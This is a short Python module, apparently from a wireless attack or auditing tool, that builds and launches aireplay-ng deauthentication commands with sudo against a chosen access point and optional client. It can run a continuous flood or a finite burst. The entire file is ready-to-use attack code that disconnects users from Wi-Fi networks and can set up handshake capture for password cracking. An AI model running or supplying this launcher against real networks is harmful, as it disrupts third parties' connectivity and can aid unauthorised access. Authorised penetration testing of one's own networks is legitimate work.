"""aireplay-ng wrappers: deauthentication."""
from __future__ import annotations

import subprocess


def start_deauth(
    interface: str,
    bssid: str,
    client: str | None = None,
    count: int = 0,
) -> subprocess.Popen:
    """Start continuous aireplay-ng deauth with captured stdout."""
    cmd = build_deauth_cmd(interface, bssid, client, count)
    return subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1,
    )


def build_deauth_cmd(
    interface: str,
    bssid: str,
    client: str | None = None,
    count: int = 0,
) -> list[str]:
    """Compose the aireplay-ng deauth command.

    ``count=0`` means continuous (to be stopped by the parent). A non-zero
    count sends a finite burst.
    """
    cmd = [
        "sudo", "aireplay-ng",
        "--ignore-negative-one",
        "--deauth", str(count),
        "-a", bssid,
    ]
    if client:
        cmd.extend(["-c", client])
    cmd.append(interface)
    return cmd
